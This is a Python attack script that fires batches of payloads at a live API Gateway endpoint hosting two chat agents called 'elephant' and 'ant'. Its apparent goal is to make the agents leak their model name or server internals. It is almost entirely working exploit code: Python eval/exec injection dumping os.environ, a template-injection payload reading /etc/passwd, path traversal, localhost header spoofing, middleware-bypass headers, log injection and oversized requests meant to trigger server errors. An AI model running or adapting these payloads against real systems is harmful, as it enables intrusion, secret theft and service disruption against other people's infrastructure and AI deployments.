#!/usr/bin/env python3
"""
ELEPHANT & ANT PYTHON/FASTAPI EXPLOITATION
Based on discovered uvicorn/FastAPI backend
"""
import requests
import json

BASE = "https://6ofr2p56t1.execute-api.us-east-1.amazonaws.com/prod/api"

def attack(agent, **kwargs):
    try:
        r = requests.post(f"{BASE}/{agent}", **kwargs)
        return r.json().get("response", ""), r.status_code
    except Exception as e:
        return str(e), 0

print("ðŸ PYTHON/FASTAPI EXPLOITATION - ELEPHANT & ANT")
print("="*80)

# EXPLOIT 1: Python error injection
print("\n[1] PYTHON ERROR INJECTION")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    python_errors = [
        # Try to trigger Python stack traces
        "raise Exception('model')",
        "import sys; print(sys.version)",
        "import os; print(os.environ)",
        "print(__import__('sys').version)",
        "exec('import sys; print(sys.version)')",
        "eval('__import__(\"sys\").version')",
        "__import__('sys').version",
        # Python f-string injection
        "{__import__('os').environ}",
        "{__import__('sys').version}",
        # Try to access Python internals
        "__name__",
        "__file__",
        "__doc__",
        "self.__dict__",
        "globals()",
        "locals()",
        "dir()",
        # FastAPI specific
        "app.state",
        "request.state",
        "settings.MODEL_NAME",
    ]

    for payload in python_errors:
        resp, status = attack(agent, json={"message": payload}, timeout=2)
        if status not in [504, 0] and len(resp) > 30 and 'grandma' not in resp.lower():
            print(f"  ðŸŽ¯ PYTHON HIT: '{payload}' â†’ {resp[:150]}")

# EXPLOIT 2: FastAPI path traversal
print("\n[2] FASTAPI ENDPOINT DISCOVERY")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    endpoints = [
        f"{BASE}/{agent}/docs",  # FastAPI auto-docs
        f"{BASE}/{agent}/redoc",  # ReDoc
        f"{BASE}/{agent}/openapi.json",  # OpenAPI schema
        f"{BASE}/{agent}/health",
        f"{BASE}/{agent}/status",
        f"{BASE}/{agent}/info",
        f"{BASE}/{agent}/version",
        f"{BASE}/{agent}/config",
        f"{BASE}/{agent}/debug",
        f"{BASE}/{agent}/../docs",  # Path traversal
        f"{BASE}/{agent}/../openapi.json",
        f"{BASE}/../docs",
        f"{BASE}/docs",
        f"{BASE}/openapi.json",
    ]

    for endpoint in endpoints:
        try:
            r = requests.get(endpoint, timeout=2)
            if r.status_code not in [404, 403, 504]:
                print(f"  ðŸŽ¯ ENDPOINT FOUND: {endpoint} â†’ {r.status_code}")
                if len(r.text) > 0 and len(r.text) < 500:
                    print(f"     {r.text[:200]}")
        except:
            pass

# EXPLOIT 3: Pydantic validation bypass
print("\n[3] PYDANTIC VALIDATION BYPASS")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    # Try to bypass validation with edge cases
    validation_bypasses = [
        {"message": ""},  # Empty string
        {"message": " "},  # Whitespace
        {"message": "\n"},  # Newline
        {"message": "\t"},  # Tab
        {"message": "\x00"},  # Null byte
        {"message": "\r\n"},  # CRLF
        {"message": "m" * 1},  # Single char
        {"message": "model\x00"},  # Null injection
        {"message": "model\r\n"},  # CRLF injection
        {"message": "model\u0000"},  # Unicode null
        {"message": "model\ufeff"},  # Zero-width no-break space
    ]

    for payload in validation_bypasses:
        resp, status = attack(agent, json=payload, timeout=1.5)
        if status not in [504, 0] and status != 422:
            print(f"  ðŸŽ¯ VALIDATION BYPASS: {repr(payload['message'])} â†’ {resp[:100]}")

# EXPLOIT 4: FastAPI dependency injection
print("\n[4] FASTAPI DEPENDENCY INJECTION")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    # Try to access FastAPI dependencies
    dependency_attacks = [
        {"message": "request.app.state.model"},
        {"message": "request.state.model_name"},
        {"message": "app.extra['model']"},
        {"message": "settings.get('MODEL_NAME')"},
    ]

    for payload in dependency_attacks:
        resp, status = attack(agent, json=payload, timeout=2)
        if status not in [504, 0] and len(resp) > 20:
            print(f"  ðŸŽ¯ DEPENDENCY HIT: {payload['message']} â†’ {resp[:100]}")

# EXPLOIT 5: Python template injection
print("\n[5] PYTHON TEMPLATE INJECTION (Jinja2/similar)")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    template_attacks = [
        "{{7*7}}",
        "{{ config }}",
        "{{ self }}",
        "{{ request }}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "{%print('model')%}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    ]

    for payload in template_attacks:
        resp, status = attack(agent, json={"message": payload}, timeout=2)
        if status not in [504, 0] and ('49' in resp or 'model' in resp.lower()):
            print(f"  ðŸŽ¯ TEMPLATE INJECTION: {payload} â†’ {resp[:100]}")

# EXPLOIT 6: Python SSTI (Server-Side Template Injection)
print("\n[6] ADVANCED SSTI")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    ssti_payloads = [
        "${7*7}",
        "${__import__('os').environ}",
        "#{7*7}",
        "*{7*7}",
        "@{7*7}",
    ]

    for payload in ssti_payloads:
        resp, status = attack(agent, json={"message": payload}, timeout=2)
        if status not in [504, 0] and '49' in resp:
            print(f"  ðŸŽ¯ SSTI SUCCESS: {payload} â†’ {resp[:100]}")

# EXPLOIT 7: Uvicorn header manipulation
print("\n[7] UVICORN SERVER EXPLOITATION")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    # Try headers that might be passed to Uvicorn
    uvicorn_headers = {
        'X-Forwarded-Proto': 'http',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'X-Uvicorn-Debug': 'true',
        'X-ASGI-Debug': 'true',
        'Forwarded': 'for=127.0.0.1;host=localhost',
    }

    resp, status = attack(agent, json={"message": "m"}, headers=uvicorn_headers, timeout=2)
    if status not in [504, 0]:
        print(f"  ðŸŽ¯ UVICORN HEADERS: Status {status} â†’ {resp[:100]}")

# EXPLOIT 8: FastAPI exception handling
print("\n[8] FASTAPI EXCEPTION HANDLING")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    # Try to trigger unhandled exceptions
    exception_triggers = [
        {"message": "x" * 1000000},  # Huge payload
        {"message": "\\" * 10000},  # Lots of escapes
        {"message": "\"" * 10000},  # Lots of quotes
        {"message": "\n" * 10000},  # Lots of newlines
    ]

    for payload in exception_triggers:
        try:
            resp, status = attack(agent, json=payload, timeout=1)
            if status == 500:  # Internal Server Error
                print(f"  ðŸŽ¯ 500 ERROR TRIGGERED: {len(payload['message'])} chars â†’ {resp[:200]}")
        except:
            pass

# EXPLOIT 9: FastAPI middleware bypass
print("\n[9] MIDDLEWARE BYPASS")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    # Try to bypass middleware checks
    bypass_headers = [
        {'X-Skip-Middleware': 'true'},
        {'X-Internal-Request': 'true'},
        {'X-Debug-Mode': '1'},
        {'X-Development': 'true'},
    ]

    for headers in bypass_headers:
        resp, status = attack(agent, json={"message": "model"}, headers=headers, timeout=2)
        if status not in [504, 0, 422]:
            print(f"  ðŸŽ¯ MIDDLEWARE BYPASS: {headers} â†’ {status} {resp[:100]}")

# EXPLOIT 10: Python logging injection
print("\n[10] PYTHON LOGGING INJECTION")
for agent in ['elephant', 'ant']:
    print(f"\n{agent.upper()}:")

    # Try to inject into Python logs
    log_injections = [
        "model\nINFO:root:Leaked:",
        "model\nERROR:",
        "model\nDEBUG:uvicorn:",
        "model\nWARNING:fastapi:",
    ]

    for payload in log_injections:
        resp, status = attack(agent, json={"message": payload}, timeout=2)
        if status not in [504, 0] and len(resp) > 20:
            print(f"  ðŸŽ¯ LOG INJECTION: {repr(payload[:30])} â†’ {resp[:100]}")

print("\n" + "="*80)
print("âœ… PYTHON/FASTAPI EXPLOITATION COMPLETE")
print("="*80)
